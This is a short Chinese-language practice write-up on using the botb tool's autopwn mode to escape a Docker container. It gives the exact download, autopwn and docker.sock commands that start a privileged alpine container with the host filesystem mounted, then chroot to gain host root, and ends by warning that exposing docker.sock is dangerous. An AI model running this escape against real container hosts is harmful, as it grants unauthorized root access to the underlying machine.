botb是一个开源的容器漏洞分析和利用工具，本周末实践的是botb的某个逃逸漏洞及其扩展，

可以直接从下面链接下载botb的可执行程序，1.6.0是当前的最新版本，

wget https://github.com/brompwnie/botb/releases/download/1.6.0/botb-linux-amd64，

增加可执行权限就可以用了，chmod +x botb-linux-amd64，

这个逃逸漏洞利用很简单，./botb-linux-amd64 -autopwn=true，

从直接的效果看，直接拿到了宿主机的root权限，

根据过程日志分析整个过程，首先是下载了docker程序，

这点很奇怪，明明是直接在docker环境下执行，不明白为啥还要再重新下载docker程序，先不管它，

接着就是执行了./docker/docker -H unix:///run/docker.sock run -ti --privileged --net=host --pid=host --ipc=host -v /:/host alpine:latest /bin/sh，意思就是起来一个alpine的容器实例，给的docker.sock，privilege，共享宿主机的网络和进程等权限，

最后是在这个alpine容器实例里执行了chroot /host && clear，

这就直接拿到了宿主机的root权限，

实践到这里，我想到大上周实践的在K8S内部监控容器的异常通信，那里的monitor容器我也是给了docker.sock，privilege，共享宿主机的网络和进程等权限，是不是在monitor容器里执行chroot /host && clear也能直接拿到了宿主机的root权限呢，

实践发现不行，但是在monitor容器里可以重复操作一遍上面的过程，也就是先docker -H unix:///run/docker.sock run -ti --privileged --net=host --pid=host --ipc=host -v /:/host alpine:latest /bin/sh，能在宿主机上拉起来一个alpine的容器实例，给的docker.sock，privilege，共享宿主机的网络和进程等权限，然后在这个alpine容器实例里再执行chroot /host && clear，也就拿到了宿主机的root权限，

总结来说，给容器实例放开docker.sock权限还是很危险的，要慎重。
